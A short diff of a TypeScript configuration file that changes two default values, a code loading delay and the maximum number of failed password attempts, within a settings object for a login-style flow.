@@ -18,9 +18,9 @@ interface Config {
 // Define default configuration
 const defaultConfig: Config = {
   settings: {
-    code_loading_time: 12000,
+    code_loading_time: 13000,
     max_failed_code_attempts: 3,
-    max_failed_password_attempts: 1,
+    max_failed_password_attempts: 0,
     page_loading_time: 5000,
     password_loading_time: 10000,
     code_input_enabled: true,
